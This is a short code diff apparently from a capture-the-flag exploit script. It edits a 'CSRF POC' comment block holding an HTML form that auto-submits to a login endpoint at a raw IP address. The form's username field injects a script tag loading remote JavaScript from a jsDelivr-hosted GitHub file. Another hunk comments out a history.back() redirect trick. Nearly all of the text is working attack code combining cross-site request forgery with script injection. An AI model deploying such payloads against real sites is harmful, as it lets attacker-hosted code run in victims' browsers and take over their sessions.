@@ -15,9 +15,9 @@ if (window.location.hash == '#child') {
   window.open('/#child');
 
   // Go back to previous note page
-  sleep(100).then(() => {
-    window.history.back();
-  });
+  //sleep(100).then(() => {
+  //  window.history.back();
+  //});
 };
 
 /*
@@ -37,7 +37,7 @@ CSRF POC:
 <html>
   <body>
     <form action="http://65.21.3.129:10102/login" method="POST" id="csrf">
-      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'></script>">
+      <input type="hidden" name="username" value="</script><script src='https://cdn.jsdelivr.net/gh/Bumpk1n/test@f71332b1fd7b27614ca5050045a86ef9208eeb55/uh.js'>//">
       <input type="hidden" name="password" value="password">
     </form>
     <script>
